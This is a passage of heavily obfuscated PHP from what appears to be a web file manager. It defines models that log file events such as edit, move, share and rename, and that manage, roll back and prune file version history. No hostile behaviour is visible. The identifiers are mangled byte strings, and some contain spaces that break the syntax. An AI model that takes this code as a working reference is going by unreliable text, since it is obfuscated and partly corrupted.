$fÁ—²ª¥¯ = array_merge($fÁ—²ª¥¯, $cÍµ…µ‚±); } goto e•©¢Áİâ; añÚ­ßç¶Á: } public function authTargetInfoMake($dÜ©»ÕŞÉ») { goto FÙè¤ğ½ã; FÙè¤ğ½ã: $eø–‰ê¨¡¦ =& $_SERVER[¬ı§†‰ú˜¼]; $E©¿ÔŠó“µ = array(); $e–ÕÏëÇÔì = array(); goto e’à¡ğˆ¬; eƒ¾Ö¨¶ƒÜ: return array($eø–‰ê¨¡¦[1894] => $E©¿ÔŠó“µ, $eø–‰ê¨¡¦[1895] => $e–ÕÏëÇÔì); goto Eø«÷ÑºÂ; e’à¡ğˆ¬: foreach ($dÜ©»ÕŞÉ» as $Dïç Ë»Ó) { if ($Dïç Ë»Ó[$eø–‰ê¨¡¦[402]] == SourceModel::TYPE_USER) { $E©¿ÔŠó“µ[] = intval($Dïç Ë»Ó[$eø–‰ê¨¡¦[482]]); } else { if ($Dïç Ë»Ó[$eø–‰ê¨¡¦[402]] == SourceModel::TYPE_GROUP) { $e–ÕÏëÇÔì[] = intval($Dïç Ë»Ó[$eø–‰ê¨¡¦[482]]); } } } if ($E©¿ÔŠó“µ) { $E©¿ÔŠó“µ = Model($eø–‰ê¨¡¦[501])->userListInfo($E©¿ÔŠó“µ); } if ($e–ÕÏëÇÔì) { $dÛ¦ÍíØ’ì = array($eø–‰ê¨¡¦[1768] => array($eø–‰ê¨¡¦[409], $e–ÕÏëÇÔì)); $e–ÕÏëÇÔì = Model($eø–‰ê¨¡¦[484])->field($eø–‰ê¨¡¦[1893])->where($dÛ¦ÍíØ’ì)->select(); $e–ÕÏëÇÔì = array_to_keyvalue($e–ÕÏëÇÔì, $eø–‰ê¨¡¦[1690]); } goto eƒ¾Ö¨¶ƒÜ; Eø«÷ÑºÂ: } public function authInfo($E‹æ—Ø‚É¡) { $føì™™“¹ğ =& $_SERVER[¬ı§†‰ú˜¼]; if ($E‹æ—Ø‚É¡[$føì™™“¹ğ[1785]]) { $cáâµ‚²Ãò = Model($føì™™“¹ğ[1857])->listData($E‹æ—Ø‚É¡[$føì™™“¹ğ[1785]]); if (!$cáâµ‚²Ãò) { return !1; $a‰îºÉÒĞ = Model($føì™™“¹ğ[1857])->listData(); $dóæŞ„ë‹æ = array_filter_by_field($a‰îºÉÒĞ, $føì™™“¹ğ[404], $føì™™“¹ğ[495]); return $dóæŞ„ë‹æ; } $EèĞ…öƒ = array_field_key($cáâµ‚²Ãò, array($føì™™“¹ğ[392], $føì™™“¹ğ[28], $føì™™“¹ğ[404], $føì™™“¹ğ[1711], $føì™™“¹ğ[1713])); $EèĞ…öƒ[$føì™™“¹ğ[1896]] = $E‹æ—Ø‚É¡; return $EèĞ…öƒ; } else { return array($føì™™“¹ğ[410] => 0, $føì™™“¹ğ[1696] => $E‹æ—Ø‚É¡[$føì™™“¹ğ[1839]], $føì™™“¹ğ[411] => $føì™™“¹ğ[33], $føì™™“¹ğ[1711] => $føì™™“¹ğ[1897]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\143\x65\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\146\x75\x6e\143\164\x69\x6f\x6e"), array("\144\145\x73\143", '', "\x69\156\163\x65\x72\x74\54\x75\x70\144\x61\x74\x65\x2c\x73\145\x6c\145\143\164", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($AáÜâ†ò„, $F²Ê¤ÃëÊ°, $F„Û¶ˆ‘Ñ‹ = '') { goto CñëÏññÌ; a¤Œâ²§˜¸: return $this->add($bÄ…ì‚ˆ…±); goto Cà÷Ñ©‡ ù; c—¥‹Ùªõ: if (!$B¤¤ºÕË†) { return !1; } if ($this->isCacheEvent($B¤¤ºÕË†, $F²Ê¤ÃëÊ°)) { return; } if ($F„Û¶ˆ‘Ñ‹ && is_string($F„Û¶ˆ‘Ñ‹)) { $F„Û¶ˆ‘Ñ‹ = array($B†Øç¢åİ[1723] => $F„Û¶ˆ‘Ñ‹); } goto cêò£×‰Ã¦; cêò£×‰Ã¦: $bÄ…ì‚ˆ…± = array($B†Øç¢åİ[408] => $AáÜâ†ò„, $B†Øç¢åİ[1898] => $B¤¤ºÕË†[$B†Øç¢åİ[476]], $B†Øç¢åİ[1899] => $B¤¤ºÕË†[$B†Øç¢åİ[28]], $B†Øç¢åİ[493] => $B¤¤ºÕË†[$B†Øç¢åİ[493]], $B†Øç¢åİ[1519] => USER_ID, $B†Øç¢åİ[413] => $F²Ê¤ÃëÊ°, $B†Øç¢åİ[1521] => $F„Û¶ˆ‘Ñ‹); $this->addSystemLog($F²Ê¤ÃëÊ°, $bÄ…ì‚ˆ…±); unset($bÄ…ì‚ˆ…±[$B†Øç¢åİ[1899]], $bÄ…ì‚ˆ…±[$B†Øç¢åİ[493]]); goto a¤Œâ²§˜¸; CñëÏññÌ: $B†Øç¢åİ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->eventSave) { return; } $B¤¤ºÕË† = Model($B†Øç¢åİ[1204])->sourceInfo($AáÜâ†ò„); goto c—¥‹Ùªõ; Cà÷Ñ©‡ ù: } private function addSystemLog($AŠëßõ©…Ó, $eÀ˜ù¥¼–) { $c·áôÚ¶Ú =& $_SERVER[¬ı§†‰ú˜¼]; if ($AŠëßõ©…Ó == $c·áôÚ¶Ú[1900]) { $AŠëßõ©…Ó = $eÀ˜ù¥¼–[$c·áôÚ¶Ú[429]][$c·áôÚ¶Ú[1901]]; } else { if (in_array($AŠëßõ©…Ó, array($c·áôÚ¶Ú[1667], $c·áôÚ¶Ú[1902]))) { $AŠëßõ©…Ó = $eÀ˜ù¥¼–[$c·áôÚ¶Ú[429]][$c·áôÚ¶Ú[717]]; } } $dö³¥˜‘‘· = array_merge($eÀ˜ù¥¼–, array($c·áôÚ¶Ú[1903] => $eÀ˜ù¥¼–[$c·áôÚ¶Ú[394]], $c·áôÚ¶Ú[1904] => $eÀ˜ù¥¼–[$c·áôÚ¶Ú[1904]])); Model($c·áôÚ¶Ú[1631])->addLog($c·áôÚ¶Ú[1905] . $AŠëßõ©…Ó, $dö³¥˜‘‘·); } private function isCacheEvent($AÃö¶åÛ…—, $b‘¹İä•ô¦) { if ($AÃö¶åÛ…—[$_SERVER[¬ı§†‰ú˜¼][402]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($BÃ†šºÖõ—, $B…Ã«— ‘¥) { $FÉàÏğÍÉÒ =& $_SERVER[¬ı§†‰ú˜¼]; $e…“‹ŸÊøÈ = Model($FÉàÏğÍÉÒ[1204])->sourceInfo($BÃ†šºÖõ—); $Eé¬Ş„×Ñ¿ = array($FÉàÏğÍÉÒ[1901] => $B…Ã«— ‘¥, $FÉàÏğÍÉÒ[28] => $e…“‹ŸÊøÈ[$FÉàÏğÍÉÒ[28]]); return $this->addEvent($BÃ†šºÖõ—, $FÉàÏğÍÉÒ[1900], $Eé¬Ş„×Ñ¿); } public function eventFileEdit($B°÷¿ƒ˜‘) { $f¼¥°´†å‰ =& $_SERVER[¬ı§†‰ú˜¼]; $DôÓíÃíÒ¿ = array($f¼¥°´†å‰[1906] => $_SERVER[$f¼¥°´†å‰[1907]], $f¼¥°´†å‰[1908] => strtolower(ACTION)); return $this->addEvent($B°÷¿ƒ˜‘, $f¼¥°´†å‰[1657], $DôÓíÃíÒ¿); } public function eventRecycle($fõ‡Ñõ…³º, $E£®Æ¨Àöä) { return $this->addEvent($fõ‡Ñõ…³º, $_SERVER[¬ı§†‰ú˜¼][1902], $E£®Æ¨Àöä); } public function eventRemove($FŒÃ’§ï‘Æ) { $E¦åƒ×·•â =& $_SERVER[¬ı§†‰ú˜¼]; $CÏ¾»Ú = Model($E¦åƒ×·•â[1204])->sourceInfo($FŒÃ’§ï‘Æ); $f—Á„Ûª™İ = $CÏ¾»Ú[$E¦åƒ×·•â[28]]; return $this->addEvent($CÏ¾»Ú[$E¦åƒ×·•â[476]], $E¦åƒ×·•â[1656], $f—Á„Ûª™İ); } public function eventShare($dèƒï”àñŸ, $f÷ŠâÅœ¿¹) { return $this->addEvent($dèƒï”àñŸ, $_SERVER[¬ı§†‰ú˜¼][1667], $f÷ŠâÅœ¿¹); } public function eventMove($a´§³à‚§á, $få¥³â, $aˆ›ê•š¹) { goto e†î¬ù­ê¥; aç®ÜÌ²¶‰: $this->addEvent($a´§³à‚§á, $e­çÙ’’­[519], $cì‚›’øÇ); $e®ØÉ¡ƒ = $BôÑ×ÛÍ¨¼->sourceInfo($a´§³à‚§á); $cì‚›’øÇ = array($e­çÙ’’­[394] => $e®ØÉ¡ƒ[$e­çÙ’’­[394]], $e­çÙ’’­[28] => $e®ØÉ¡ƒ[$e­çÙ’’­[28]]); goto C¯ÆœÛÏèñ; e†î¬ù­ê¥: $e­çÙ’’­ =& $_SERVER[¬ı§†‰ú˜¼]; $BôÑ×ÛÍ¨¼ = Model($e­çÙ’’­[1204]); $e®ØÉ¡ƒ = $BôÑ×ÛÍ¨¼->sourceInfo($a´§³à‚§á); goto b’Îéíïë; C¯ÆœÛÏèñ: $this->addEvent($få¥³â, $e­çÙ’’­[1912], $cì‚›’øÇ); goto cóñœ—çïÂ; b’Îéíïë: $Dï‡±Éèâµ = $BôÑ×ÛÍ¨¼->sourceInfo($få¥³â); $C°†‚‚ñÖ  = $BôÑ×ÛÍ¨¼->sourceInfo($aˆ›ê•š¹); $cì‚›’øÇ = array($e­çÙ’’­[1054] => $få¥³â, $e­çÙ’’­[1909] => $Dï‡±Éèâµ[$e­çÙ’’­[28]], $e­çÙ’’­[1889] => $Dï‡±Éèâµ[$e­çÙ’’­[493]], $e­çÙ’’­[1055] => $aˆ›ê•š¹, $e­çÙ’’­[1910] => $C°†‚‚ñÖ [$e­çÙ’’­[28]], $e­çÙ’’­[1911] => $C°†‚‚ñÖ [$e­çÙ’’­[493]]); goto aç®ÜÌ²¶‰; cóñœ—çïÂ: } public function eventCopy($aÍŸ»Öœöï) { $this->eventCreate($aÍŸ»Öœöï, $_SERVER[¬ı§†‰ú˜¼][517]); } public function eventRename($CªÀÊ±, $dŠ©±ï›‚, $A‚â“ÇßÎ¡) { $Dˆø©Èí’ä =& $_SERVER[¬ı§†‰ú˜¼]; $B÷š£ó…Æ = array($Dˆø©Èí’ä[1054] => $dŠ©±ï›‚, $Dˆø©Èí’ä[1055] => $A‚â“ÇßÎ¡); return $this->addEvent($CªÀÊ±, $Dˆø©Èí’ä[1218], $B÷š£ó…Æ); } public function eventAddComment($D¨‘°´ŠŒ, $e‰‰ÂÊÏ‹) { return $this->addEvent($D¨‘°´ŠŒ, $_SERVER[¬ı§†‰ú˜¼][1913], $e‰‰ÂÊÏ‹); } public function eventAddDesc($Açˆ¯¼åÜ, $FİŠÍ˜¬) { return $this->addEvent($Açˆ¯¼åÜ, $_SERVER[¬ı§†‰ú˜¼][1914], $FİŠÍ˜¬); } public function listBySource($DÓøÚµñ’¯) { goto FĞãº‹›ùß; Aˆˆ…ã­ŞÕ: if ($AÆ³„  â¯[$f­Ñ’Ş‘”«[401]] == $f­Ñ’Ş‘”«[87]) { $bñ øÕ¹ª = Model($f­Ñ’Ş‘”«[1204])->listSearchChildren($DÓøÚµñ’¯, 20000); $bñ øÕ¹ª[] = $DÓøÚµñ’¯ . $f­Ñ’Ş‘”«[374]; $c‰éÛ™¶Œ” = array($f­Ñ’Ş‘”«[394] => array($f­Ñ’Ş‘”«[7], $bñ øÕ¹ª)); } $DÂ–Óµ³Í = $this->where($c‰éÛ™¶Œ”)->order($f­Ñ’Ş‘”«[1915])->selectPage(); if ($DÂ–Óµ³Í[$f­Ñ’Ş‘”«[363]][$f­Ñ’Ş‘”«[364]] == 0) { $DÂ–Óµ³Í[$f­Ñ’Ş‘”«[363]][$f­Ñ’Ş‘”«[364]] = 1; $DÂ–Óµ³Í[$f­Ñ’Ş‘”«[366]] = array(array($f­Ñ’Ş‘”«[408] => $DÓøÚµñ’¯, $f­Ñ’Ş‘”«[1898] => $AÆ³„  â¯[$f­Ñ’Ş‘”«[476]], $f­Ñ’Ş‘”«[1519] => $AÆ³„  â¯[$f­Ñ’Ş‘”«[430]], $f­Ñ’Ş‘”«[413] => $f­Ñ’Ş‘”«[1916], $f­Ñ’Ş‘”«[414] => $AÆ³„  â¯[$f­Ñ’Ş‘”«[193]], $f­Ñ’Ş‘”«[1521] => $f­Ñ’Ş‘”«[33])); } goto cÜÓö‰ã®“; cÜÓö‰ã®“: return $this->eventListParse($DÂ–Óµ³Í, $DÓøÚµñ’¯); goto c™Æ¡ÇÀ; FĞãº‹›ùß: $f­Ñ’Ş‘”« =& $_SERVER[¬ı§†‰ú˜¼]; $AÆ³„  â¯ = Model($f­Ñ’Ş‘”«[1204])->sourceInfo($DÓøÚµñ’¯); $c‰éÛ™¶Œ” = array($f­Ñ’Ş‘”«[408] => $DÓøÚµñ’¯); goto Aˆˆ…ã­ŞÕ; c™Æ¡ÇÀ: } private function eventListParse($Eš ÙùÏÒ™, $f—¡·½£­) { goto f…ß–ö·ƒˆ; aµèæ×µìğ: $d«ìã†Â†° = array_to_keyvalue($Fµ†ƒõ¦Â, $Bš½ÜñÙù¦[33], $Bš½ÜñÙù¦[1904]); foreach ($Fµ†ƒõ¦Â as $b—ÙÅã) { $CØ°¢á®Œµ = $b—ÙÅã[$Bš½ÜñÙù¦[429]]; if ($b—ÙÅã[$Bš½ÜñÙù¦[29]] == $Bš½ÜñÙù¦[519] && isset($CØ°¢á®Œµ[$Bš½ÜñÙù¦[1054]])) { $fØê±¡¹¯Î[] = $CØ°¢á®Œµ[$Bš½ÜñÙù¦[1054]] . $Bš½ÜñÙù¦[33]; $fØê±¡¹¯Î[] = $CØ°¢á®Œµ[$Bš½ÜñÙù¦[1055]] . $Bš½ÜñÙù¦[33]; } if ($b—ÙÅã[$Bš½ÜñÙù¦[29]] == $Bš½ÜñÙù¦[1912] && isset($CØ°¢á®Œµ[$Bš½ÜñÙù¦[394]])) { $fØê±¡¹¯Î[] = $CØ°¢á®Œµ[$Bš½ÜñÙù¦[394]] . $Bš½ÜñÙù¦[33]; } } $fØê±¡¹¯Î = array_merge($fØê±¡¹¯Î, $d«ìã†Â†°, array($f—¡·½£­ . $Bš½ÜñÙù¦[33])); goto E½¬§†×ÌŞ; f…ß–ö·ƒˆ: $Bš½ÜñÙù¦ =& $_SERVER[¬ı§†‰ú˜¼]; $Fµ†ƒõ¦Â = $Eš ÙùÏÒ™[$Bš½ÜñÙù¦[366]]; $fØê±¡¹¯Î = array_to_keyvalue($Fµ†ƒõ¦Â, $Bš½ÜñÙù¦[33], $Bš½ÜñÙù¦[394]); goto aµèæ×µìğ; eÌšÆÇàš‘: $Eš ÙùÏÒ™[$Bš½ÜñÙù¦[366]] = $Fµ†ƒõ¦Â; return $Eš ÙùÏÒ™; goto dïÒç™¸èÓ; E½¬§†×ÌŞ: $fØê±¡¹¯Î = array_unique($fØê±¡¹¯Î); $c»óôåóÀÊ = array_unique(array_to_keyvalue($Fµ†ƒõ¦Â, $Bš½ÜñÙù¦[33], $Bš½ÜñÙù¦[1527])); $bªğ‚¬çÍ = Model($Bš½ÜñÙù¦[505])->userListInfo($c»óôåóÀÊ); goto e‹±åğ‰†²; e‹±åğ‰†²: $E£ËÉÅ´×¦ = Model($Bš½ÜñÙù¦[798])->sourceListInfo($fØê±¡¹¯Î, !0); foreach ($Fµ†ƒõ¦Â as &$b—ÙÅã) { if ($b—ÙÅã[$Bš½ÜñÙù¦[29]] == $Bš½ÜñÙù¦[519] && isset($b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[1054]])) { $b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[1054]] = $E£ËÉÅ´×¦[$b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[1054]]]; $b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[1055]] = $E£ËÉÅ´×¦[$b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[1055]]]; } if ($b—ÙÅã[$Bš½ÜñÙù¦[29]] == $Bš½ÜñÙù¦[1912] && isset($b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[394]])) { $b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[394]] = $E£ËÉÅ´×¦[$b—ÙÅã[$Bš½ÜñÙù¦[429]][$Bš½ÜñÙù¦[394]]]; } $b—ÙÅã[$Bš½ÜñÙù¦[85]] = $E£ËÉÅ´×¦[$b—ÙÅã[$Bš½ÜñÙù¦[394]]]; $b—ÙÅã[$Bš½ÜñÙù¦[1917]] = $E£ËÉÅ´×¦[$b—ÙÅã[$Bš½ÜñÙù¦[1904]]]; if ($b—ÙÅã[$Bš½ÜñÙù¦[29]] == $Bš½ÜñÙù¦[1656]) { $b—ÙÅã[$Bš½ÜñÙù¦[1917]] = $b—ÙÅã[$Bš½ÜñÙù¦[85]]; $b—ÙÅã[$Bš½ÜñÙù¦[1904]] = $b—ÙÅã[$Bš½ÜñÙù¦[1917]][$Bš½ÜñÙù¦[394]]; $b—ÙÅã[$Bš½ÜñÙù¦[85]] = !1; $b—ÙÅã[$Bš½ÜñÙù¦[394]] = $Bš½ÜñÙù¦[33]; } $b—ÙÅã[$Bš½ÜñÙù¦[1847]] = $bªğ‚¬çÍ[$b—ÙÅã[$Bš½ÜñÙù¦[1527]]]; } unset($b—ÙÅã); goto eÌšÆÇàš‘; dïÒç™¸èÓ: } public function removeBySource($D¾Â‹¼“–) { $AÑ–Èñé„» = array($_SERVER[¬ı§†‰ú˜¼][408] => $D¾Â‹¼“–); $this->where($AÑ–Èñé„»)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\143\145\x5f\150\x69\x73\164\157\162\171"; public function historyCount($EÊ•—ÕÙØ) { goto DÇ¦½‚ë×; aÅ¯®ğ°¤‘: return array_to_keyvalue($Bµ¤ã¥¿Ëˆ, $B­ å½±ä[394], $B­ å½±ä[478]); goto eŒ‰³ŸÀ‡’; fºÀÄ™Ğ¸Œ: $E×ŞõÆ¬ğÅ = array($B­ å½±ä[394], $B­ å½±ä[1722] => $B­ å½±ä[478]); $A˜¹ë»Ûóö = array($B­ å½±ä[394] => array($B­ å½±ä[7], $EÊ•—ÕÙØ)); $Bµ¤ã¥¿Ëˆ = $this->field($E×ŞõÆ¬ğÅ)->where($A˜¹ë»Ûóö)->group($B­ å½±ä[394])->select(); goto aÅ¯®ğ°¤‘; DÇ¦½‚ë×: $B­ å½±ä =& $_SERVER[¬ı§†‰ú˜¼]; if (!$EÊ•—ÕÙØ) { return array(); } if (is_string($EÊ•—ÕÙØ) || is_int($EÊ•—ÕÙØ)) { $EÊ•—ÕÙØ = array($EÊ•—ÕÙØ); } goto fºÀÄ™Ğ¸Œ; eŒ‰³ŸÀ‡’: } public function addHistory($dØÒÙ‚¤š·, $B‡¼Üª›ˆŠ = '') { $fÜäÈ²í´ =& $_SERVER[¬ı§†‰ú˜¼]; $e¬­Ğô­¨ = array($fÜäÈ²í´[408] => $dØÒÙ‚¤š·[$fÜäÈ²í´[394]], $fÜäÈ²í´[1519] => isset($dØÒÙ‚¤š·[$fÜäÈ²í´[432]]) ? $dØÒÙ‚¤š·[$fÜäÈ²í´[432]] : $dØÒÙ‚¤š·[$fÜäÈ²í´[430]], $fÜäÈ²í´[446] => $dØÒÙ‚¤š·[$fÜäÈ²í´[445]], $fÜäÈ²í´[547] => $dØÒÙ‚¤š·[$fÜäÈ²í´[78]], $fÜäÈ²í´[1918] => $B‡¼Üª›ˆŠ); $c¤æåÌÙ¡¿ = $GLOBALS[$fÜäÈ²í´[6]][$fÜäÈ²í´[88]][$fÜäÈ²í´[1103]]; if ($c¤æåÌÙ¡¿ > 1) { $this->historyAutoClear($e¬­Ğô­¨[$fÜäÈ²í´[394]]); $this->add($e¬­Ğô­¨); } Hook::trigger($fÜäÈ²í´[1919], $e¬­Ğô­¨); Model($fÜäÈ²í´[1920])->eventFileEdit($dØÒÙ‚¤š·[$fÜäÈ²í´[394]]); } private function historyAutoClear($Bˆ¹í•ã®) { goto eçôÀ‡åìâ; a‡Ùºá„¬: $aòêÈˆ®ë = array($B¿ÓØÖ‡ËŒ[408] => $Bˆ¹í•ã®); $A ©ŒŠœ = $this->field($B¿ÓØÖ‡ËŒ[1921])->where($aòêÈˆ®ë)->order($B¿ÓØÖ‡ËŒ[1915])->select(); if (!$A ©ŒŠœ || $DÆ¤÷™â— >= count($A ©ŒŠœ)) { return; } goto A…âñˆŠ§©; A…âñˆŠ§©: $Eíî®¶È“Ñ = array_to_keyvalue($A ©ŒŠœ, $B¿ÓØÖ‡ËŒ[33], $B¿ÓØÖ‡ËŒ[392]); $Eíî®¶È“Ñ = array_slice($Eíî®¶È“Ñ, $DÆ¤÷™â—); $d‚„ ·ÉÃ« = array_to_keyvalue($A ©ŒŠœ, $B¿ÓØÖ‡ËŒ[33], $B¿ÓØÖ‡ËŒ[445]); goto bæÔƒ²öØ£; bæÔƒ²öØ£: $d‚„ ·ÉÃ« = array_slice($d‚„ ·ÉÃ«, $DÆ¤÷™â—); if (!$Eíî®¶È“Ñ || !$d‚„ ·ÉÃ«) { return; } $aòêÈˆ®ë = array($B¿ÓØÖ‡ËŒ[410] => array($B¿ÓØÖ‡ËŒ[7], $Eíî®¶È“Ñ)); goto eÚº®£Œê´; eçôÀ‡åìâ: $B¿ÓØÖ‡ËŒ =& $_SERVER[¬ı§†‰ú˜¼]; $aÇëåä­Õ = Model($B¿ÓØÖ‡ËŒ[731])->get($B¿ÓØÖ‡ËŒ[1124]); $fˆÃãñƒç‚ = $GLOBALS[$B¿ÓØÖ‡ËŒ[6]][$B¿ÓØÖ‡ËŒ[88]][$B¿ÓØÖ‡ËŒ[1103]]; goto B§ÑÓ›ŸÚ; eÚº®£Œê´: $this->where($aòêÈˆ®ë)->delete(); Model($B¿ÓØÖ‡ËŒ[448])->remove($d‚„ ·ÉÃ«); goto cÙå’®…; B§ÑÓ›ŸÚ: $DÆ¤÷™â— = $aÇëåä­Õ == $B¿ÓØÖ‡ËŒ[1125] ? 5 : $fˆÃãñƒç‚; if ($fˆÃãñƒç‚ <= 1) { $DÆ¤÷™â— = 1; } if ($DÆ¤÷™â— >= 500) { return; } goto a‡Ùºá„¬; cÙå’®…: } public function listData($eÛäòœØ¹ã) { goto dÙ¦„Î…ö¡; bª‹·Åµ: $e¯î¬Å­¶¬ = $this->field($dĞ¹’ÜÕ»ó)->where($d¸«Š÷ŒÇ)->order($D§¯Ê Á«÷[1915])->selectPage(); $this->_listAppendUser($e¯î¬Å­¶¬[$D§¯Ê Á«÷[366]]); $FË¥ßÎ•à¦ = Model($D§¯Ê Á«÷[731])->get($D§¯Ê Á«÷[1124]); goto dß¥‹É§åæ; dß¥‹É§åæ: $c÷ Ê²®¢÷ = 5; if ($FË¥ßÎ•à¦ == $D§¯Ê Á«÷[1125]) { $e¯î¬Å­¶¬[$D§¯Ê Á«÷[366]] = array_slice($e¯î¬Å­¶¬[$D§¯Ê Á«÷[366]], 0, $c÷ Ê²®¢÷); $e¯î¬Å­¶¬[$D§¯Ê Á«÷[363]] = array($D§¯Ê Á«÷[1923] => 1, $D§¯Ê Á«÷[1924] => 20, $D§¯Ê Á«÷[1925] => 1, $D§¯Ê Á«÷[1926] => count($e¯î¬Å­¶¬[$D§¯Ê Á«÷[366]])); } return $e¯î¬Å­¶¬; goto A‘‘Ù”ÆÄë; dÙ¦„Î…ö¡: $D§¯Ê Á«÷ =& $_SERVER[¬ı§†‰ú˜¼]; $d¸«Š÷ŒÇ = array($D§¯Ê Á«÷[408] => $eÛäòœØ¹ã); $dĞ¹’ÜÕ»ó = $D§¯Ê Á«÷[1922]; goto bª‹·Åµ; A‘‘Ù”ÆÄë: } protected function _listAppendUser(&$bèâ°°‘º†) { $e‰¹šÎÒˆ =& $_SERVER[¬ı§†‰ú˜¼]; $b…ºš¨Çñ = array_to_keyvalue($bèâ°°‘º†, $e‰¹šÎÒˆ[33], $e‰¹šÎÒˆ[1527]); $f…‰Úå‹ğ = Model($e‰¹šÎÒˆ[505])->userListInfo($b…ºš¨Çñ); foreach ($bèâ°°‘º† as &$BÉÚŞ¯Š£Û) { $FŞ˜‡§±¡Ï = $BÉÚŞ¯Š£Û[$e‰¹šÎÒˆ[1527]]; $BÉÚŞ¯Š£Û[$e‰¹šÎÒˆ[430]] = $f…‰Úå‹ğ[$FŞ˜‡§±¡Ï] ? $f…‰Úå‹ğ[$FŞ˜‡§±¡Ï] : !1; } unset($BÉÚŞ¯Š£Û); } public function fileInfo($f‰óÄÈµèí) { $A³Åº„¨ƒ¨ =& $_SERVER[¬ı§†‰ú˜¼]; $eº–Ş²ê“‘ = $this->tablePrefix; $cŠ·ì¡Ëãµ = "{$eº–Ş²ê“‘}\151\x6f\137\x66\x69\154\x65\40\x66\x69\154\145\163\40\157\156\x20\x66\x69\x6c\145\x73\x2e\146\x69\154\x65\x49\x44\40\x3d\40\150\x69\163\164\x6f\x72\x79\x2e\x66\x69\154\145\x49\104"; return $this->alias($A³Åº„¨ƒ¨[1927])->where(array($A³Åº„¨ƒ¨[410] => $f‰óÄÈµèí))->join($cŠ·ì¡Ëãµ, $A³Åº„¨ƒ¨[1928])->find(); } public function removeItem($C¨§ÒÒšèØ) { $A°…Ğ®ºÛ¯ =& $_SERVER[¬ı§†‰ú˜¼]; $cÈáš¹™£œ = array($A°…Ğ®ºÛ¯[410] => $C¨§ÒÒšèØ); $b¬œå‹ÄŠ = $this->where($cÈáš¹™£œ)->find(); if ($b¬œå‹ÄŠ) { $cõ¡«ØŸìè = $this->where($cÈáš¹™£œ)->delete(); Model($A°…Ğ®ºÛ¯[448])->remove($b¬œå‹ÄŠ[$A°…Ğ®ºÛ¯[445]]); return $cõ¡«ØŸìè; } return !1; } public function removeBySource($B‡ãˆçó®ƒ) { goto dİ§Äëê°; F‹ç¹÷•Ë: $BîÙ¯ä¤’’ = array($a§Á›÷›§[408] => array($a§Á›÷›§[7], $B‡ãˆçó®ƒ)); $Cë¯½“×… = $this->field($a§Á›÷›§[446])->where($BîÙ¯ä¤’’)->select(); if ($Cë¯½“×…) { $this->where($BîÙ¯ä¤’’)->delete(); $a±¼µØ• = array_to_keyvalue($Cë¯½“×…, $a§Á›÷›§[33], $a§Á›÷›§[445]); Model($a§Á›÷›§[448])->remove($a±¼µØ•); } goto AÛ‘…ÚÊØñ; AÛ‘…ÚÊØñ: return !0; goto DêË·¶Ä‰Ã; dİ§Äëê°: $a§Á›÷›§ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$B‡ãˆçó®ƒ) { return !1; } if (!is_array($B‡ãˆçó®ƒ)) { $B‡ãˆçó®ƒ = array($B‡ãˆçó®ƒ); } goto F‹ç¹÷•Ë; DêË·¶Ä‰Ã: } public function setDetail($Cô‘àéÌ, $Eˆ‡ñšäÈ¿) { $B«ŸºîÌã” =& $_SERVER[¬ı§†‰ú˜¼]; return $this->where(array($B«ŸºîÌã”[410] => $Cô‘àéÌ))->save(array($B«ŸºîÌã”[1918] => $Eˆ‡ñšäÈ¿)); } public function rollbackToItem($Eë¿ÌÒ»ò, $EÑÔá—Ïø‰) { goto a¶“‘½ˆ¡Ü; a¶“‘½ˆ¡Ü: $c‰¶Âùñ¨‡ =& $_SERVER[¬ı§†‰ú˜¼]; $fÍàÔá¥Ù· = Model($c‰¶Âùñ¨‡[798])->sourceInfo($Eë¿ÌÒ»ò); $this->addHistory($fÍàÔá¥Ù·, LNG($c‰¶Âùñ¨‡[1929])); goto B™éù«ã†¬; a—½È·Ô¶: return $this->where(array($c‰¶Âùñ¨‡[410] => $EÑÔá—Ïø‰))->delete(); goto bç–ñ¼Ü¯¡; B™éù«ã†¬: $AÌËŒ¢öÆĞ = $this->find($EÑÔá—Ïø‰); $e°ù³ÒÜ = array($c‰¶Âùñ¨‡[445] => $AÌËŒ¢öÆĞ[$c‰¶Âùñ¨‡[445]], $c‰¶Âùñ¨‡[78] => $AÌËŒ¢öÆĞ[$c‰¶Âùñ¨‡[78]], $c‰¶Âùñ¨‡[84] => time(), $c‰¶Âùñ¨‡[432] => USER_ID); Model($c‰¶Âùñ¨‡[798])->where(array($c‰¶Âùñ¨‡[394] => $Eë¿ÌÒ»ò))->save($e°ù³ÒÜ); goto a—½È·Ô¶; bç–ñ¼Ü¯¡: } public function clearSame($A‚Å¬áÓ‡) { goto FÏ¡¨»™¦; c¤’ƒ×Ú½Ï: if (!$E§“¥§¼ƒ–) { return; } $this->where(array($EäßÅñÕæ[392] => array($EäßÅñÕæ[7], $E§“¥§¼ƒ–)))->delete(); Model($EäßÅñÕæ[448])->remove($c®ì³†ï¿); goto báÆ®ÛèÑ¯; FÏ¡¨»™¦: $EäßÅñÕæ =& $_SERVER[¬ı§†‰ú˜¼]; $EÊƒ¦¯–Ì¾ = $this->listData($A‚Å¬áÓ‡); $aãöÉØå½¬ = array_to_keyvalue_group($EÊƒ¦¯–Ì¾, $EäßÅñÕæ[445]); goto aš¢ÜÄìò; aš¢ÜÄìò: $c®ì³†ï¿ = array(); $E§“¥§¼ƒ– = array(); foreach ($aãöÉØå½¬ as $F¿œâ­Ùî) { if (!$F¿œâ­Ùî || count($F¿œâ­Ùî) <= 1) { continue; } foreach ($F¿œâ­Ùî as $CëˆÛ†–ä¶) { 